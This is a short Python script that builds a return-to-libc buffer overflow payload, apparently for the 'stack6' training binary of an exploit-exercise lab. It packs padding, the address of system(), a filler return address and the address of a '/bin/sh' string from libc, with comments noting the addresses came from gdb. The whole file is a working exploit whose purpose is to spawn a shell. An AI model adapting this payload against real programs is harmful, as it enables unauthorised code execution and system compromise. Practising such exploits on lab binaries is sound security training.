import struct
padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
system = struct.pack("I",0xb7ecffb0) #return pointer of the next step in the getpath() function - found in gdb of stack6
return_after_system = "AAAA" #Next step after the return address mem location (goes into seg fault) 
bin_sh = struct.pack("I",0xb7fb63bf) # The string that we want to execute that we've found from libc in the C code - can find with seach in gdb

print padding + system + return_after_system + bin_sh
